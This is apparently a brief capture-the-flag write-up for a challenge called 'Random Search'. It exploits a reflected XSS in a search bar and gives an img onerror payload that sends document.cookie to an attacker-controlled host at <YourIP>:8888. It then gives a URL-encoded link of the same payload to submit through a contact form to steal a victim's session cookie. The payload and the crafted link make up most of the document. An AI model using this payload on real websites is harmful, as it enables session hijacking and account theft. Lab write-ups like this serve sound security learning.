# Random Search

We can see that the search bar has an XSS inside. We run our cookie stealer and then search for this string: 
```html
<img src=x onerror="this.src='http://<YourIP>:8888/?'+document.cookie; this.removeAttribute('onerror');">```

You can see that your cookie is correctly stolen, 

Then send in contact this URL :

http://localhost:8000/index.php?search=%3Cimg+src%3Dx+onerror%3D%22this.src%3D%27http%3A%2F%2F%3CYourIP%3E%3A8888%2F%3F%27%2Bdocument.cookie%3B+this.removeAttribute%28%27onerror%27%29%3B%22%3E